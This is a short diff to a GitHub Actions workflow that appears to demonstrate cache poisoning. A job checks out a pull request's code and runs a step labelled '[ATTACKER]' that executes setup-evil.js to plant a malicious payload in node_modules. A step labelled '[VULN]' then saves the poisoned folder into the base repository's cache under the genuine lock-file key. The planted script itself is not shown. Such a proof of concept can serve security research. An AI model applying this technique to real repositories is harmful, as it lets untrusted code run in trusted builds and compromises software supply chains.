@@ -12,17 +12,16 @@ jobs:
         with:
           ref: ${{ github.event.pull_request.head.sha }}
 
-      - name: "[ATTACKER] Plant malicious node_modules"
-        run: node setup-evil.js 2>/dev/null || echo "setup-evil.js not found on main branch"
+      - name: "[ATTACKER] Plant malicious payload"
+        run: |
+          node setup-evil.js
+          echo "--- node_modules after plant ---"
+          find node_modules -name "*.js" 2>/dev/null | head -5
+          echo "--- content of helper ---"
+          cat node_modules/helper/index.js | head -5
 
-      - name: "[VULN] Save node_modules to BASE REPO cache"
+      - name: "[VULN] Save poisoned cache to base repo"
         uses: actions/cache/save@v4
         with:
           path: node_modules
           key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}
-
-      - name: Confirm cache key used
-        run: |
-          echo "Cache key: Linux-node-${{ hashFiles('package-lock.json') }}"
-          echo "node_modules contents:"
-          ls node_modules/ 2>/dev/null || echo "(empty)"
